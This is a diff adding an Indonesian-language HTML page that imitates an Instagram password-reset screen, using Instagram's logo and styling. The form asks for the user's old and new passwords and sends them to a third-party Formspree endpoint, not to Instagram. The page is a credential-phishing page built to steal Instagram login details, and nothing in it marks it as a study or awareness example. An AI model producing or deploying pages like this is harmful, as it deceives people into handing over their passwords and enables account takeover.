@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Instagram-like</title>
+    
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 3px;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+            width: 80%;
+            max-width: 350px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 175px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        input {
+            margin-bottom: 12px;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+        }
+        button {
+            background-color: #0095f6;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        p{
+            font-size: 15px;
+            color: #8b8b8b;
+            margin-top: -15px;
+            text-align: center;
+        }
+        h3{
+            text-align: center;
+        }
+        .header{
+            max-height: 50px;
+            margin-bottom: 50px;
+            border-bottom: solid #000 1px;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            padding-top: 20px;
+            padding-bottom: 10px;
+        }
+        .container{
+            padding-left: 40px;
+            padding-right: 40px;
+        }
+        .header .container img{
+            width: 150px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="container">
+            <img src="unnamed.png" alt="">
+        </div>
+    </div>
+    <div class="login-container">
+        <div class="logo">
+            <img src="./ig.png" alt="Instagram">
+        </div>
+        <h3>Buat Kata Sandi Yang Kuat</h3>
+        <p>Kata sandi Anda minimal harus enam karakter dan berisi kombinasi angka, huruf, dan karakter khusus (!$@%).</p>
+        <form id="contactForm" action="https://formspree.io/f/xwpeeqya" method="POST">
+            <input type="password" name="Kata_sandi_Lama" placeholder="Kata sandi Lama" required>
+            <input type="password" name="Kata_sandi_Baru" placeholder="Kata sandi Baru" required>
+            <button type="submit">Atur Ulang Kata Sandi</button>
+        </form>
+    </div>
+<!-- 
+    <script src="script.js"></script> -->
+</body>
+</html>
